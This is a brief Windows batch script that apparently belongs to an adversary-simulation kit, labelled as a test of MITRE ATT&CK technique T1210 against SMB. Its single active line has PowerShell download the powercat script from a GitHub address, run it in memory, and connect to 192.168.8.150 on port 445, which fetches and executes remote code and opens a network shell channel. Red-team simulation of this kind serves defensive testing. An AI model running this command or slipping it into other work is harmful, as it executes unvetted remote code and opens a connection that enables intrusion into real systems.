@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Exploitation of Remote Services (T1210)
ECHO.
ECHO [+] Simulate Exploitation of Remote Services "SMB"
ECHO -------------------------------------------------------------------
cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rajrakeshdr/powercat/master/powercat.ps1'); powercat -c 192.168.8.150 -p 445
ECHO.

